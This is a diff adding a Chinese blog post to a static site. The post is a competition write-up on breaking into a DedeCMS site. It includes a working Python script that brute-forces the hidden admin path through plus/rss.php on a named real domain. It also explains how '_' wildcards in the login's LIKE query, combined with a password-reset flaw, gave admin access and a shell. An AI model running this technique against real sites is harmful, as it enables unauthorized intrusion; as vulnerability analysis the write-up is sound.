@@ -63,6 +63,73 @@
 
   
     
+    <h3 class="article-title"><a href="/2018/09/20/dedecms-guess-admin-username-trick/"><span>Dedecms 猜后台管理员账号的一个小技巧</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/09/20/dedecms-guess-admin-username-trick/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-09-20T12:58:29.000Z">
+          2018-09-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>巅峰极客里遇到的一个案例(yx-tv.com)。</p>
+<p>案例为,windows下的dedecms 好像是2017版本, 开启了会员中心,修改了后台的路径,<br>然后用之前windows下dedecms找后台路径的方法, 发现tags.php被删除了,<br>但是plus/rss.php文件存在, 然后用这方法就成功的找到了后台。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">payloads &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789_-&#39;</span><br><span class="line"></span><br><span class="line">menu &#x3D; &#39;&#39;</span><br><span class="line">for k in range(10):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        data &#x3D; &quot;dopost&#x3D;save&amp;_FILES[b4dboy][tmp_name]&#x3D;..&#x2F;%s%s&lt;&#x2F;images&#x2F;admin_top_logo.gif&amp;_FILES[b4dboy][name]&#x3D;0&amp;_FILES[b4dboy][size]&#x3D;0&amp;_FILES[b4dboy][type]&#x3D;image&#x2F;gif&quot;% (menu, payload)</span><br><span class="line">        res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;www.yx-tv.com&#x2F;plus&#x2F;rss.php&quot;, data&#x3D;data, headers&#x3D;&#123;&quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;&#125;)</span><br><span class="line">        if res.content.decode(&quot;utf-8&quot;).find(&quot;Error&quot;) &gt; -1:</span><br><span class="line">            menu +&#x3D; payload</span><br><span class="line">            break</span><br><span class="line">        if payload &#x3D;&#x3D; &#39;-&#39;:</span><br><span class="line">            print(menu)</span><br><span class="line">            sys.exit()</span><br><span class="line">print(menu)</span><br></pre></td></tr></table></figure>
+
+<p>然后猜了下后台的管理员账户, 没猜到, admin直接提示账户不存在。<br>然后再利用之前的重置管理员密码的漏洞。<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1959">https://xz.aliyun.com/t/1959</a><br>成功重置了管理员的密码, 但是修改cookie登录后, 发现显示的管理员账号是admin, 但是之前在登录后台的时候试了下admin, 是直接提示的账户不存在。<br>(好像是显示的是uname, 但是最终登录是看的userid)</p>
+<p>后面发现在dede/login.php中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $cuserLogin-&gt;checkUser($userid,$pwd);</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  检验用户是否正确</span><br><span class="line"> *</span><br><span class="line"> * @access    public</span><br><span class="line"> * @param     string    $username  用户名</span><br><span class="line"> * @param     string    $userpwd  密码</span><br><span class="line"> * @return    string</span><br><span class="line"> *&#x2F;</span><br><span class="line">function checkUser($username, $userpwd)</span><br><span class="line">&#123;</span><br><span class="line">    global $dsql;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;只允许用户名和密码用0-9,a-z,A-Z,&#39;@&#39;,&#39;_&#39;,&#39;.&#39;,&#39;-&#39;这些字符</span><br><span class="line">    $this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br><span class="line">    $this-&gt;userPwd &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $userpwd);</span><br><span class="line">    $pwd &#x3D; substr(md5($this-&gt;userPwd), 5, 20);</span><br><span class="line">    $dsql-&gt;SetQuery(&quot;SELECT admin.*,atype.purviews FROM &#96;#@__admin&#96; admin LEFT JOIN &#96;#@__admintype&#96; atype ON atype.rank&#x3D;admin.usertype WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;&#39; LIMIT 0,1&quot;);</span><br><span class="line">    $dsql-&gt;Execute();</span><br><span class="line">    $row &#x3D; $dsql-&gt;GetObject();</span><br><span class="line">    if(!isset($row-&gt;pwd))</span><br><span class="line">    &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    else if($pwd!&#x3D;$row-&gt;pwd)</span><br><span class="line">    &#123;</span><br><span class="line">        return -2;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $loginip &#x3D; GetIP();</span><br><span class="line">        $this-&gt;userID &#x3D; $row-&gt;id;</span><br><span class="line">        $this-&gt;userType &#x3D; $row-&gt;usertype;</span><br><span class="line">        $this-&gt;userChannel &#x3D; $row-&gt;typeid;</span><br><span class="line">        $this-&gt;userName &#x3D; $row-&gt;uname;</span><br><span class="line">        $this-&gt;userPurview &#x3D; $row-&gt;purviews;</span><br><span class="line">        $inquery &#x3D; &quot;UPDATE &#96;#@__admin&#96; SET loginip&#x3D;&#39;$loginip&#39;,logintime&#x3D;&#39;&quot;.time().&quot;&#39; WHERE id&#x3D;&#39;&quot;.$row-&gt;id.&quot;&#39;&quot;;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($inquery);</span><br><span class="line">        $sql &#x3D; &quot;UPDATE #@__member SET logintime&#x3D;&quot;.time().&quot;, loginip&#x3D;&#39;$loginip&#39; WHERE mid&#x3D;&quot;.$row-&gt;id;</span><br><span class="line">        $dsql-&gt;ExecuteNoneQuery($sql);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先通过用户输入的用户名查询出密码, 如果有记录的话, 就比对密码。<br>但是在这里 根据用户名查询密码的时候</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE admin.userid LIKE &#39;&quot;.$this-&gt;userName.&quot;</span><br></pre></td></tr></table></figure>
+<p>竟然是用的like。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br></pre></td></tr></table></figure>
+<p>虽然在前面有把一些用户名不允许的字符给替换为空了, 想直接用%这种匹配任意数量字符的模糊查询出数据就不行了。<br>但是可以看到这个过滤没有把_替换为空。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">With LIKE you can use the following two wildcard characters in the pattern:</span><br><span class="line"></span><br><span class="line">% matches any number of characters, even zero characters.</span><br><span class="line"></span><br><span class="line">_ matches exactly one character.</span><br></pre></td></tr></table></figure>
+
+<p>在mysql中的模糊查询中, _也代表着匹配一个任意字符。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/dede_guess_1.jpg" alt="-w1406"></p>
+<p>所以在不知道管理员的用户名的情况下， 只要去用_跑一下, 当_的位数和管理员账户的位数相同时即可登录成功了。 </p>
+<p>巅峰极客的是4位数, 然后用之前修改管理员密码的洞修改的密码, 就成功登录了后台, 然后后台getshell, 就搞定了。</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2018/07/15/CSP-unsafe-inline时-引入外部js/"><span>CSP unsafe-inline时, 引入外部js</span></a></h3>
     
   
